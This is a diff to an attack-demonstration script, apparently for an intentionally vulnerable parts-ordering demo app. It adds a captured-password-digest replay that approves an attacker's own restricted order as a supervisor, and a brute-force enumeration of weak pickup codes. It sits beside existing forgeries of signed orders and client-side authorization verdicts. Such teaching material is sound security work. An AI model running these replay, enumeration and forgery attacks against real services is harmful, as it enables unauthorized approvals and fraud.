@@ -12,9 +12,12 @@ import re
 import sys
 from collections.abc import Callable, Sequence
 from dataclasses import dataclass, field
+from datetime import UTC, datetime
 
 import httpx
 
+from ..fixtures import CAPTURED_SUPERVISOR_DIGEST
+from ..hashing import sha256_hex
 from ..signing import canonical_order_string, sign
 
 # Public fixture credentials for the low-privilege insider the demo casts as the attacker.
@@ -73,10 +76,17 @@ def extract_key_from_config(client: httpx.Client, base_url: str) -> tuple[str, s
     return str(key), config_url
 
 
-def login(client: httpx.Client, base_url: str, account: str, password: str) -> None:
-    res = client.post(
-        f"{base_url}/api/login", json={"account_id": account, "password": password}
+def login(
+    client: httpx.Client, base_url: str, account: str, password: str, *, digest: bool = False
+) -> None:
+    # The vulnerable app takes a digest (the client-hashed credential sink); others take the
+    # password verified by the KDF.
+    body = (
+        {"account_id": account, "password_digest": sha256_hex(password)}
+        if digest
+        else {"account_id": account, "password": password}
     )
+    res = client.post(f"{base_url}/api/login", json=body)
     if res.status_code != 200:
         raise RuntimeError(f"Login failed for {account}: {res.status_code}")
 
@@ -96,10 +106,11 @@ def _forge(
     quantity: int,
     within_limit: bool | None,
     requires_supervisor: bool | None,
+    digest_login: bool,
 ) -> AttackResult:
     with httpx.Client(timeout=15.0) as client:
         key, source = extractor(client, base_url)
-        login(client, base_url, account, password)
+        login(client, base_url, account, password, digest=digest_login)
 
         line_total = unit_price_cents * quantity
         order: dict[str, object] = {
@@ -158,7 +169,8 @@ def forge_embedded_key_order(
         note="Valid signature over a false price and restriction; the server trusted them.",
         account=account, password=password, part_number=part_number,
         work_order_id=work_order_id, unit_price_cents=unit_price_cents,
-        restricted=restricted, quantity=quantity, within_limit=None, requires_supervisor=None,
+        restricted=restricted, quantity=quantity, within_limit=None,
+        requires_supervisor=None, digest_login=True,
     )
 
 
@@ -183,7 +195,109 @@ def forge_client_verdict_order(
         account=account, password=password, part_number=RESTRICTED_PART,
         work_order_id=DEFAULT_WORK_ORDER, unit_price_cents=RESTRICTED_PART_PRICE,
         restricted=True, quantity=1, within_limit=True, requires_supervisor=False,
+        digest_login=not from_config,
     )
+
+
+def replay_digest_attack(
+    base_url: str,
+    *,
+    attacker: str = DEFAULT_ACCOUNT,
+    attacker_password: str = DEFAULT_PASSWORD,
+    captured_digest: str = CAPTURED_SUPERVISOR_DIGEST,
+) -> AttackResult:
+    """Replay the supervisor's captured digest to approve the attacker's own restricted order."""
+
+    with httpx.Client(timeout=15.0) as atk:
+        key, _ = extract_key_from_source(atk, base_url)
+        login(atk, base_url, attacker, attacker_password, digest=True)
+        # An honest restricted order -> pending_supervisor, awaiting an approval the attacker
+        # is about to grant themselves.
+        order: dict[str, object] = {
+            "part_number": RESTRICTED_PART, "quantity": 1, "work_order_id": DEFAULT_WORK_ORDER,
+            "unit_price_cents": RESTRICTED_PART_PRICE, "restricted": True,
+            "line_total_cents": RESTRICTED_PART_PRICE,
+            "within_limit": False, "requires_supervisor": True,
+        }
+        canonical = canonical_order_string(
+            part_number=RESTRICTED_PART, quantity=1, work_order_id=DEFAULT_WORK_ORDER,
+            unit_price_cents=RESTRICTED_PART_PRICE, restricted=True,
+            line_total_cents=RESTRICTED_PART_PRICE, within_limit=False,
+            requires_supervisor=True,
+        )
+        created = atk.post(
+            f"{base_url}/api/orders", json=order,
+            headers={"X-Ninebark-Signature": sign(key, canonical)},
+        )
+        order_id = created.json()["id"]
+
+    with httpx.Client(timeout=15.0) as sup:
+        # No password is known — only the captured digest, which the server treats as proof.
+        res = sup.post(
+            f"{base_url}/api/login",
+            json={"account_id": "sup-navarro", "password_digest": captured_digest},
+        )
+        if res.status_code != 200:
+            raise RuntimeError("Captured-digest replay failed to authenticate.")
+        approve = sup.post(f"{base_url}/api/orders/{order_id}/approve")
+
+    body = approve.json() if approve.headers.get("content-type", "").startswith(
+        "application/json"
+    ) else {}
+    return AttackResult(
+        sink="captured-digest-replay", extracted_value=captured_digest,
+        extracted_source="checked-in fictional digest fixture",
+        request={"login": {"account_id": "sup-navarro", "password_digest": captured_digest},
+                 "approve": f"/api/orders/{order_id}/approve"},
+        response_status=approve.status_code, response_body=body,
+        order_state=body.get("state") if isinstance(body, dict) else None,
+        notes=["Approved the attacker's own restricted order as the supervisor; no password."],
+    )
+
+
+@dataclass
+class PickupEnumResult:
+    candidate_count: int
+    bound: int
+    tried: int
+    accepted_code: str | None
+    order_state: str | None
+
+    def render(self) -> str:
+        return "\n".join([
+            "# sink: weak-pickup-code",
+            f"candidates: {self.candidate_count} (bound: {self.bound})",
+            f"tried:      {self.tried}",
+            f"accepted:   {self.accepted_code}",
+            f"outcome:    order state = {self.order_state}",
+        ])
+
+
+def enumerate_pickup_attack(
+    base_url: str,
+    order_id: str,
+    *,
+    account: str = DEFAULT_ACCOUNT,
+    password: str = DEFAULT_PASSWORD,
+    bound: int = 1000,
+) -> PickupEnumResult:
+    """Enumerate the fixed <=1,000-candidate window derived from the disclosed created_at."""
+
+    with httpx.Client(timeout=15.0) as client:
+        login(client, base_url, account, password, digest=True)
+        queue = client.get(f"{base_url}/api/orders").json()
+        target = next((o for o in queue if o["id"] == order_id), None)
+        if target is None:
+            raise RuntimeError(f"Order {order_id} not visible in the shared queue.")
+        epoch = int(
+            datetime.fromisoformat(target["created_at"]).replace(tzinfo=UTC).timestamp()
+        )
+        candidates = [f"PU-{epoch}-{i:03d}" for i in range(bound)]
+        for tried, code in enumerate(candidates, start=1):
+            res = client.post(f"{base_url}/api/pickup", json={"code": code})
+            if res.status_code == 200:
+                return PickupEnumResult(len(candidates), bound, tried, code, res.json()["state"])
+    return PickupEnumResult(len(candidates), bound, len(candidates), None, None)
 
 
 def build_parser() -> argparse.ArgumentParser:
@@ -193,6 +307,9 @@ def build_parser() -> argparse.ArgumentParser:
     sub.add_parser("embedded-key", help="Forge false facts with the shipped HMAC key")
     sub.add_parser("client-verdict", help="Forge the client-computed authorization verdict")
     sub.add_parser("half-fixed", help="Defeat the half-fixed variant via its runtime key")
+    sub.add_parser("replay-digest", help="Replay the supervisor's captured password digest")
+    enum = sub.add_parser("enumerate-pickup", help="Enumerate a weak pickup code (<=1000)")
+    enum.add_argument("--order", required=True, help="Target order id from the shared queue")
     return parser
 
 
@@ -200,14 +317,17 @@ def main(argv: Sequence[str] | None = None) -> int:
     args = build_parser().parse_args(argv)
     base_url = args.base_url.rstrip("/")
     if args.sink == "embedded-key":
-        result = forge_embedded_key_order(base_url)
+        print(forge_embedded_key_order(base_url).render())
     elif args.sink == "client-verdict":
-        result = forge_client_verdict_order(base_url)
+        print(forge_client_verdict_order(base_url).render())
     elif args.sink == "half-fixed":
-        result = forge_client_verdict_order(base_url, from_config=True)
+        print(forge_client_verdict_order(base_url, from_config=True).render())
+    elif args.sink == "replay-digest":
+        print(replay_digest_attack(base_url).render())
+    elif args.sink == "enumerate-pickup":
+        print(enumerate_pickup_attack(base_url, args.order).render())
     else:  # pragma: no cover
         return 2
-    print(result.render())
     return 0
 
 
